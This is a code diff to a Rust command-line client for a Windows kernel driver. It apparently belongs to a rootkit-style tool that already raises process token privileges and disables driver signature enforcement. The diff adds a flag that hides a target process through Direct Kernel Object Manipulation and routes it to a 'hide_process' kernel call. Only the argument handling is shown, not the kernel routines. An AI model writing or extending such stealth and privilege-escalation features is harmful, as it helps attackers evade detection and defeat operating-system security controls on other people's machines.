@@ -22,7 +22,7 @@ enum Commands {
 #[clap(group(
     ArgGroup::new("process")
         .required(true)
-        .args(&["protect", "unprotect", "elevate"]),
+        .args(&["protect", "unprotect", "elevate", "hide"]),
 ))]
 struct Process {
     /// Target process name
@@ -40,6 +40,10 @@ struct Process {
     /// Elevate all token privileges
     #[clap(long, short)]
     elevate: bool,
+
+    /// Hide a process using Direct Kernel Object Manipulation (DKOM)
+    #[clap(long)]
+    hide: bool,
 }
 
 #[derive(Args)]
@@ -102,10 +106,12 @@ fn main() {
                 kernel_interface::protect_process(process_id, driver_handle);
             } else if p.unprotect {
                 kernel_interface::unprotect_process(process_id, driver_handle);
-            }
-
-            if p.elevate {
+            } else if p.elevate {
                 kernel_interface::enable_tokens(process_id, driver_handle);
+            } else if p.hide {
+                kernel_interface::hide_process(process_id, driver_handle);
+            } else {
+                println!("[-] Invalid arguments");
             }
         }
         Commands::Callbacks(c) => {
@@ -122,6 +128,8 @@ fn main() {
                 kernel_interface::enable_or_disable_dse(driver_handle, true);
             } else if d.disable {
                 kernel_interface::enable_or_disable_dse(driver_handle, false);
+            } else {
+                println!("[-] Invalid arguments");
             }
         }
     }
